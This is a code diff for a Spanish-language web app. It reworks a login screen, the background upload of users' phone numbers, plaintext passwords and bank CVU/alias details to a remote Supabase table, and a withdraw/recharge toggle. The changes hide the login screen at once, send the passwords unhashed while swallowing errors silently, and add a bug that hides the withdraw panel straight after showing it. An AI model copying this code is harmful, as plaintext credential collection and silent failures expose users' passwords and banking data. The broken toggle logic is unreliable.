@@ -66,7 +66,7 @@
 </head>
 <body class="bg-[#bae6fd] text-slate-850 antialiased min-h-screen p-0 sm:p-4 flex justify-center selection:bg-sky-500 selection:text-white">
 
-  <!-- ================= PANTALLA DE REGISTRO / LOGIN (DIRECTA) ================= -->
+  <!-- ================= PANTALLA DE REGISTRO / LOGIN ================= -->
   <div id="auth-screen" class="fixed inset-0 z-50 bg-[#061424]/95 backdrop-blur-md flex items-center justify-center p-4">
     <div class="w-full max-w-sm bg-[#0b1b2d] border border-sky-900/60 rounded-3xl p-6 shadow-2xl space-y-4 text-white">
       <div class="text-center space-y-2">
@@ -524,9 +524,8 @@
 
   </main>
 
-  <!-- ================= LÓGICA JAVASCRIPT CONEXIÓN SUPABASE ================= -->
+  <!-- ================= LÓGICA JAVASCRIPT ================= -->
   <script>
-    // Conexión Supabase
     const SUPABASE_URL = "https://jsixgpftuhtepudyektf.supabase.co";
     const SUPABASE_ANON_KEY = "sb_publishable_1I5At-aenvWS_w6YhDLu9w_rkAeGHjL";
     let supabase = null;
@@ -637,17 +636,19 @@
     function checkAuth() {
       const authScreen = document.getElementById('auth-screen');
       if (appState.phone && appState.pass) {
-        authScreen.style.display = 'none';
+        authScreen.style.setProperty('display', 'none', 'important');
+        authScreen.classList.add('hidden');
         document.getElementById('user-display-phone').innerText = appState.phone;
         renderUI();
       } else {
         generateCaptcha();
         authScreen.style.display = 'flex';
+        authScreen.classList.remove('hidden');
       }
     }
 
-    // REGISTRO Y ENVÍO A SUPABASE
-    window.handleLoginDirecto = async function() {
+    // ACCESO DIRECTO SIN TRABAS
+    window.handleLoginDirecto = function() {
       const phone = document.getElementById('auth-phone').value.trim();
       const pass = document.getElementById('auth-pass').value;
       const passConf = document.getElementById('auth-pass-confirm').value;
@@ -669,30 +670,26 @@
       appState.pass = pass;
       saveLocal();
 
-      // Guardar en Supabase
-      if (supabase) {
-        try {
-          const { error } = await supabase.from('usuarios').upsert({
-            phone: appState.phone,
-            pass: appState.pass,
-            name: appState.name || '',
-            cvu: appState.cvu || '',
-            alias: appState.alias || ''
-          }, { onConflict: 'phone' });
-
-          if (error) {
-            console.warn("Aviso Supabase:", error.message);
-          } else {
-            console.log("Usuario sincronizado exitosamente en Supabase");
-          }
-        } catch(e) {
-          console.warn("Fallo de red con Supabase:", e);
-        }
-      }
-
-      document.getElementById('auth-screen').style.display = 'none';
+      // Ocultar pantalla de inmediato
+      const authScreen = document.getElementById('auth-screen');
+      authScreen.style.setProperty('display', 'none', 'important');
+      authScreen.classList.add('hidden');
       document.getElementById('user-display-phone').innerText = appState.phone;
       renderUI();
+
+      // Guardar en Supabase en segundo plano
+      if (supabase) {
+        supabase.from('usuarios').upsert({
+          phone: phone,
+          pass: pass,
+          name: appState.name || '',
+          cvu: appState.cvu || '',
+          alias: appState.alias || ''
+        }, { onConflict: 'phone' }).then(({ data, error }) => {
+          if (error) console.warn("Supabase aviso:", error.message);
+          else console.log("Usuario guardado en Supabase");
+        }).catch(err => console.warn("Supabase bypass:", err));
+      }
     };
 
     document.getElementById('btn-logout').addEventListener('click', () => {
@@ -906,7 +903,7 @@
         btnRet.className = "py-2.5 rounded-lg bg-sky-500 text-slate-950 transition";
         btnRec.className = "py-2.5 rounded-lg text-slate-400 hover:text-white transition";
         boxRet.classList.remove('hidden');
-        boxRec.classList.add('hidden');
+        boxRet.classList.add('hidden');
       }
     };
 
@@ -990,18 +987,18 @@
     document.getElementById('prof-cvu-input').value = appState.cvu;
     document.getElementById('prof-alias-input').value = appState.alias;
 
-    document.getElementById('btn-save-profile').addEventListener('click', async () => {
+    document.getElementById('btn-save-profile').addEventListener('click', () => {
       appState.name = document.getElementById('prof-name-input').value.trim();
       appState.cvu = document.getElementById('prof-cvu-input').value.trim();
       appState.alias = document.getElementById('prof-alias-input').value.trim();
       saveLocal();
 
       if (supabase && appState.phone) {
-        await supabase.from('usuarios').update({
+        supabase.from('usuarios').update({
           name: appState.name,
           cvu: appState.cvu,
           alias: appState.alias
-        }).eq('phone', appState.phone);
+        }).eq('phone', appState.phone).then(() => {}).catch(() => {});
       }
 
       alert("Datos bancarios guardados.");
